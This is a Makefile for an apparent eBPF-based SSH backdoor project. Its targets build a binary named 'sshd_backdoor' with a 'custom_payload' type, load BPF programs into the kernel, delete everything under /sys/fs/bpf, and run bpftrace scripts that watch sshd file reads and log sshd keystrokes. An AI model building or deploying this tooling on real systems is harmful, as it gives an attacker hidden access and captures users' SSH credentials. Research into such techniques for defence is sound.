CLANG ?= clang
CFLAGS := -O2 -g -Wall -Werror -I /usr/include/aarch64-linux-gnu -v $(CFLAGS)
GOPROXY := 'https://goproxy.io,direct'
GENERATED_TYPE := custom_payload

build: mod_tidy generate
	go build -o sshd_backdoor cmd/main.go

generate: mod_tidy
generate: export BPF_CLANG := $(CLANG)
generate: export BPF_CFLAGS := $(CFLAGS)
generate: export GENERATED_TYPE := $(GENERATED_TYPE)
generate:
	go generate ./pkg/generate...

mod_tidy: export GOPROXY := $(GOPROXY)
mod_tidy: 
	go mod tidy

tool_load:
	bpftool prog loadall ./pkg/generate/bpf_bpfel.o /sys/fs/bpf

tool_unload:
	rm /sys/fs/bpf/*

bpftrace_sshd:
	bpftrace test/bpftrace/sshd_open_read_watch_dog.bpftrace

bpftrace_keylogging:
	bpftrace test/bpftrace/sshd_keylogging.bt

bpftrace_verbose_keylogging:
	bpftrace test/bpftrace/sshd_keylogging_verbose.bt
